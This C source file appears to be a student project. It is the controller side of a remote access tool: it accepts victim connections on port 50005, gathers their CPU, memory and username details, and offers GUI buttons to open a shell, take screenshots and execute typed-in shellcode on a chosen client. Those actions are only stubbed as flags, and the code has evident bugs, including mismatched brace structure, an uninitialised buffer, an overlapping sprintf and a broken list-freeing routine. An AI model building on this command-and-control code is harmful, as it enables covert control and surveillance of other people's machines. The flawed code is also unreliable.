#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <lmcons.h>
#include <SDL.h>
#include <SDL_ttf.h>

#include "render.h"

// For Checkers...
// For whatever reason I had this as yes/no at first...
#define FALSE 0
#define TRUE 1

#define MAX_MEMORY_SIZE 1024

// Linked list of all clients
typedef struct client {
    SOCKET client;
    struct sockaddr clientAddress;
    struct client* next;

} client_t;

void kill();
void free_client_list(client_t* client);
void window(mu_Context*, client_t* clients);

const char buttonMap[256] = {
    [SDL_BUTTON_LEFT & 0xff] = MU_MOUSE_LEFT,
    [SDL_BUTTON_RIGHT & 0xff] = MU_MOUSE_RIGHT,
    [SDL_BUTTON_MIDDLE & 0xff] = MU_MOUSE_MIDDLE
};

const char keyMap[256] = {
    [SDLK_LSHIFT & 0xff] = MU_KEY_SHIFT,
    [SDLK_RSHIFT & 0xff] = MU_KEY_SHIFT,
    [SDLK_LCTRL & 0xff] = MU_KEY_CTRL,
    [SDLK_RCTRL & 0xff] = MU_KEY_CTRL,
    [SDLK_LALT & 0xff] = MU_KEY_ALT,
    [SDLK_RALT & 0xff] = MU_KEY_ALT,
    [SDLK_RETURN & 0xff] = MU_KEY_RETURN,
    [SDLK_BACKSPACE & 0xff] = MU_KEY_BACKSPACE
};

int num_keys[] = {
    0x30,// 0 Key
    0x31,// 1 Key
    0x32,// 2 Key
    0x33,// 3 Key
    0x34,// 4 Key
    0x35,// 5 Key
    0x36,// 6 Key
    0x37,// 7 Key
    0x38,// 8 Key
    0x39,// 9 Key
    0x0D // Return Key
};

// Colours and panel details
float backgroundColours[3] = { 0, 255, 255 };
unsigned int panelID = 0;
int menuTabClick[] = { 0, 0, 0 };
int menuTab = 0;
char clientNumBuffer[1337] = "Click Client to Choose: ";

// Details
char cpuDetails[1024];
char memoryDetails[1024];
char userDetails[UNLEN + 1];

// Client information
long int clientID = 0;
long int clientCount = 0;

// Running
boolean serverRunning = FALSE;
SOCKET sock;

// Functions
boolean screenshotFunction = FALSE;
boolean shellcodeFunction = FALSE;
boolean shellFunction = FALSE;
char functionRunBytes[1024];

void client_thread(const SOCKET clientSocket) {

    int setupChecker = TRUE;

    const long int threadID = clientID;

    int runThread = TRUE;

    while (runThread) {

        if (threadID == clientID) {

            if (setupChecker) {

                // Gain CPU information
                char cpuData[MAX_MEMORY_SIZE];

                ZeroMemory(cpuData, sizeof(cpuData));
                recv(clientSocket, cpuData, sizeof(cpuData), 0);
                sprintf(cpuDetails,"%s\n", cpuData);

                // Gain Clients memory information
                char memoryData[MAX_MEMORY_SIZE];

                ZeroMemory(memoryData, sizeof(memoryData));
                recv(clientSocket, memoryData, sizeof(memoryData), 0);
                sprintf(memoryDetails, "%s\n", memoryData);

                // Gain users information
                char userData[UNLEN + 1];
                ZeroMemory(userData, sizeof(userData));
                recv(clientSocket, userData, sizeof(userData), 0);
                sprintf(userData, "%s\n", userData);

                // We have now got all required information from the client, no need to do this again.
                setupChecker = FALSE;
            }
        }


        runThread = FALSE;

    }

}

// Recursive function to find the final client in the list
__stdcall client_t* last_client(client_t* client) {
    if (client->next == NULL) {
        return client;
    }

    return last_client(client->next);
}
__stdcall void grab_client(const client_t* client, const long int clientNum) {

    // If given client number is greater than the number of clients known to the system
    if (clientNum > clientCount) {
        return;
    }

    static long int counter;
    counter++;

    if (counter == clientNum) {
        counter = 0;
        // CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)client_thread, client->client, 0, 0));
    } else {
        grab_client(client->next, clientNum);
    }
}

void update_client(client_t* clients) {
    while (serverRunning) {
        for (int x = 0; x < sizeof(num_keys) / sizeof(num_keys[0]); x++) {
            if (GetKeyState(num_keys[x]) & 0x1000) {
                char output[1337];
                if (num_keys[x] == 0x0D) {
                    char* end;
                    clientID = strtol(output, &end, 10);
                    sprintf(clientNumBuffer, "Click to Choose Client: ");

                    sprintf(userDetails, "Username: ");
                    sprintf(cpuDetails, "CPU: ");
                    sprintf(memoryDetails, "Memory: ");

                    grab_client(clients->next, clientID);
                    return;
                }

                char temp[2];
                sprintf(temp, "%d", x);

                strcat(output, temp);
                sprintf(clientNumBuffer, "%s", output);
                Sleep(500);
            }
        }
    }
}


// Add a client to the linked list.
__stdcall void add_client(client_t* clients) {

    if (clients->next == NULL) {
        clients->next = (client_t*)malloc(sizeof(client_t));
        clients->next->next = NULL;
        // Listen on the socket, somaxconn is the max number of potential connections
        listen(sock, SOMAXCONN);

        int addressLength = sizeof(clients->next->clientAddress);

        clients->next->client = accept(sock, &clients->next->clientAddress, &addressLength);

        // If the socket was invalid, remove the bad connection from the list to ensure that nothing goes wrong later
        if (clients->next->client == INVALID_SOCKET) {
            free(clients->next);
            return;
        }

        printf("New client added.\n");
        clientCount++;
    } else {
        add_client(clients->next);
    }

}

void add_clients_runner(client_t* clients) {

    while (serverRunning) {
        add_client(clients);
        Sleep(10000);
    }

}

int text_width(mu_Font font, const char* text, int num) {

    const int textSize[2] = {get_text_size(text)[0], get_text_size(text)[1]};
    return textSize[0];

}

int text_height(mu_Font font, const char* text) {

    int textSize[2] = {get_text_size(text)[0], get_text_size(text)[1]};
    return textSize[1];

}

int uint8_slider(mu_Context* context, unsigned char* value, int low, int high) {
    static float temp;
    mu_push_id(context, &value, sizeof(value));
    temp = *value;
    const int res = mu_slider_ex(context, &temp, low, high, 0, "%.0f", MU_OPT_ALIGNCENTER);
    *value = temp;
    mu_pop_id(context);
    return res;
}

void window(mu_Context* context, client_t* clients) {
    if (mu_begin_window(context, "6841 Project", mu_rect(0, 0, 750, 450))) {
        mu_Container* window = mu_get_current_container(context);
        window->rect.w = mu_max(window->rect.w, 750);
        window->rect.h = mu_max(window->rect.h, 365);

        // Main outline rectangle
        mu_Rect outlineRect = mu_rect(10, 25, 350, 400);
        mu_draw_control_frame(context, (mu_Id)&panelID, outlineRect, MU_COLOR_BASE, 0);

        // Options outline
        mu_Rect tabOutline = mu_rect(20, 50, 100, 100);
        mu_draw_control_frame(context, (mu_Id)&panelID, tabOutline, MU_COLOR_BASE, 0);

        mu_layout_set_next(context, mu_rect(50, 75, 100, 20), 0);
        if (mu_clickable_text_ex(context, "Main", 0, 0, menuTabClick[0])) {
            menuTabClick[0] = 1;
            menuTabClick[1] = 0;
            menuTabClick[2] = 0;
            menuTab = 0;
        }
    }
        mu_layout_set_next(context, mu_rect(40, 90, 100, 20), 0);
        if (mu_clickable_text_ex(context, "Settings", 0, 0, menuTabClick[1])) {
            menuTabClick[0] = 0;
            menuTabClick[1] = 1;
            menuTabClick[2] = 0;
            menuTab = 1;
        }
        mu_layout_set_next(context, mu_rect(52, 105, 100, 20), 0);
        if (mu_clickable_text_ex(context, "Exit", 0, 0, menuTabClick[2])) {
            kill();
        }

        // Menu tab 0 is the Main tab
        if (menuTab == 0) {
            mu_layout_set_next(context, mu_rect(125, 30, 225, 20), 0);
            if (mu_header_ex(context, "======== Pick Client ========", MU_OPT_EXPANDED, 175)) {
                mu_layout_set_next(context, mu_rect(125, 60, 225, 20), 0);
                if (mu_button(context, clientNumBuffer)) {
                    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)update_client, clients, 0, 0);
                }
                mu_layout_set_next(context, mu_rect(125, 90, 15, 15), 0);
                mu_Rect clientPickerInfoRect1 = mu_layout_next(context);
                mu_draw_control_text(context, "Click then type a client number", clientPickerInfoRect1, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 105, 15, 15), 0);
                mu_Rect clientPickerInfoRect2 = mu_layout_next(context);
                mu_draw_control_text(context, "Then press enter to finish!", clientPickerInfoRect2, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 120, 15, 15), 0);
                mu_Rect clientPickerInfoRect3 = mu_layout_next(context);
                mu_draw_control_text(context, "Changing client resets the currently", clientPickerInfoRect3, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 135, 15, 15), 0);
                mu_Rect clientPickerInfoRect4 = mu_layout_next(context);
                mu_draw_control_text(context, "selected client.", clientPickerInfoRect4, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 150, 15, 15), 0);
                mu_Rect clientPickerInfoRect5 = mu_layout_next(context);
                mu_draw_control_text(context, "This client will be set to last client", clientPickerInfoRect5, MU_COLOR_TEXT, 0);

                char clientNumBuf[1347];
                sprintf(clientNumBuf, "Selected Client: %ld", clientID);
                mu_layout_set_next(context, mu_rect(125, 165, 15, 15), 0);
                mu_Rect clientNumRect = mu_layout_next(context);
                mu_draw_control_text(context, clientNumBuf, clientNumRect, MU_COLOR_TEXT, 0);

                mu_layout_set_next(context, mu_rect(125, 170, 15, 15), 0);
                mu_Rect userDetailsRect = mu_layout_next(context);
                mu_draw_control_text(context, userDetails, userDetailsRect, MU_COLOR_TEXT, 0);

                mu_layout_set_next(context, mu_rect(125, 185, 15, 15), 0);
                mu_Rect cpuDetailsRect = mu_layout_next(context);
                mu_draw_control_text(context, cpuDetails, cpuDetailsRect, MU_COLOR_TEXT, 0);

                mu_layout_set_next(context, mu_rect(125, 200, 15, 15), 0);
                mu_Rect memoryDetailsRect = mu_layout_next(context);
                mu_draw_control_text(context, memoryDetails, memoryDetailsRect, MU_COLOR_TEXT, 0);
            }
            mu_layout_set_next(context, mu_rect(125, 210, 225, 20), 0);

            if (mu_header_ex(context, "========== Functions: ==========", MU_OPT_EXPANDED, 134)) {
                mu_layout_set_next(context, mu_rect(125, 231, 225, 15), 0);
                if (mu_button(context, "Start a shell on a chosen client!")) {
                    shellFunction = TRUE;
                }

                mu_layout_set_next(context, mu_rect(125, 247, 225, 15), 0);
                if (mu_button(context, "Take a screenshot of a client!")) {
                    screenshotFunction = TRUE;
                }

                char commandBytesBuffer[1024] = "";
                mu_layout_set_next(context, mu_rect(125, 263, 225, 15), 0);
                if (mu_textbox(context, commandBytesBuffer, sizeof(commandBytesBuffer)) &MU_RES_SUBMIT) {
                    mu_set_focus(context, context->last_id);
                }

                mu_layout_set_next(context, mu_rect(125, 263, 225, 15), 0);
                if (mu_button(context, "Execute shellcode on a client!")) {
                    strcpy(functionRunBytes, commandBytesBuffer);
                    shellcodeFunction = TRUE;
                }
            }
        } else if (menuTab == 1) {
            mu_layout_set_next(context, mu_rect(125, 30, 220, 20), 0);
            if (mu_header_ex(context, "                        Colour", MU_OPT_EXPANDED, 100)) {
                mu_layout_set_next(context, mu_rect(185, 60, 100, 15), 0);
                uint8_slider(context, &context->style->colors[1].r, 0, 255);

                mu_layout_set_next(context, mu_rect(185, 80, 100, 15), 0);
                uint8_slider(context, &context->style->colors[1].g, 0, 255);

                mu_layout_set_next(context, mu_rect(185, 100, 100, 15), 0);
                uint8_slider(context, &context->style->colors[1].b, 0, 255);
            }
        }

    mu_end_window(context);
}

void create_window(client_t* clients) {

    SDL_Init(SDL_INIT_EVERYTHING);
    TTF_Init();
    init(375, 450);

    printf("%lld", sizeof(mu_Context));

    mu_Context* context = malloc(sizeof(mu_Context));
    mu_init(context);

    context->text_width = text_width;
    context->text_height = text_height;

    while (serverRunning) {
        SDL_Event event;
        while (SDL_PollEvent(&event)) {

            switch (event.type) {
                case SDL_QUIT:
                    free(context);
                    kill();
                    break;
                case SDL_MOUSEMOTION:
                    mu_input_mousemove(context, event.motion.x, event.motion.y);
                    break;
                case SDL_MOUSEWHEEL:
                    mu_input_scroll(context, 0, event.wheel.y * -30);
                    break;
                case SDL_TEXTINPUT:
                    mu_input_text(context, event.text.text);
                    break;

                case SDL_MOUSEBUTTONDOWN:
                case SDL_MOUSEBUTTONUP:
                    const int b = buttonMap[event.button.button & 0xff];
                    if (b && event.type == SDL_MOUSEBUTTONDOWN) {
                        mu_input_mousedown(context, event.button.x, event.button.y, b);
                    } else {
                        mu_input_mouseup(context, event.button.x, event.button.y, b);
                    }
                    break;
                case SDL_KEYDOWN:
                case SDL_KEYUP:
                    const int k = keyMap[event.key.keysym.sym & 0xff];
                    if (k && event.type == SDL_KEYDOWN) {
                        mu_input_keydown(context, k);
                    } else {
                        mu_input_keyup(context, k);
                    }
                default:
                    break;
            }
        }

        mu_begin(context);
        window(context, clients);
        mu_end(context);

        clear(mu_color(backgroundColours[0], backgroundColours[1], backgroundColours[2],255));

        mu_Command* command = NULL;

        while (mu_next_command(context, &command)) {
            switch (command->type) {
                case MU_COMMAND_TEXT:
                    draw_text(command->text.str, command->text.pos, command->text.color);
                break;
                case MU_COMMAND_RECT:
                    draw_rect(command->rect.rect, command->rect.color);
                break;
                case MU_COMMAND_ICON:
                    draw_icons(command->icon.id, command->icon.rect);
                break;
                default:
                    break;
            }
        }

        present();

        Sleep(100);

    }

    clean();
    SDL_Quit();
    TTF_Quit();
    kill();

}

void kill(client_t* clients) {
    serverRunning = FALSE;
    free_client_list(clients);
    exit(EXIT_SUCCESS);
}

void free_client_list(client_t* client) {
    if (client->next == NULL) return;

    client_t* next = client->next;
    free(client);

    return free(next);
}

int main(int argc, char *argv[]) {

    printf("Starting to run");

    WSADATA wsaData;

    ZeroMemory(&wsaData, sizeof(wsaData));
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    struct addrinfo* ainfo;
    ZeroMemory(&ainfo, sizeof(ainfo));

    #define SUCCESS 0
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != SUCCESS) {

        printf("Could not setup winsock2\n");
        Sleep(1000);
        return 1;

    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    if (getaddrinfo(0, "50005", &hints, &ainfo) != SUCCESS) {

        printf("Could not get address info\n");
        Sleep(1000);
        WSACleanup();
        return 1;
    }

    sock = socket(ainfo->ai_family, ainfo->ai_socktype, ainfo->ai_protocol);
    if (sock == INVALID_SOCKET) {

        printf("Could not create socket\n");
        Sleep(1000);
        freeaddrinfo(ainfo);
        WSACleanup();
    }

    if (bind(sock, ainfo->ai_addr, ainfo->ai_addrlen) != SUCCESS) {

        printf("Could not bind socket\n");
        Sleep(1000);
        freeaddrinfo(ainfo);
        closesocket(sock);
        WSACleanup();
        return 1;

    }

    serverRunning = TRUE;

    freeaddrinfo(ainfo);

    client_t* clients = malloc(sizeof(client_t));
    clients->next = NULL;

    printf("Running");
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)add_clients_runner, clients, 0, 0);

    printf("Thread made");

    create_window(clients);

    printf("Window made");
    Sleep(100000);

    closesocket(sock);
    WSACleanup();

    return 0;

}

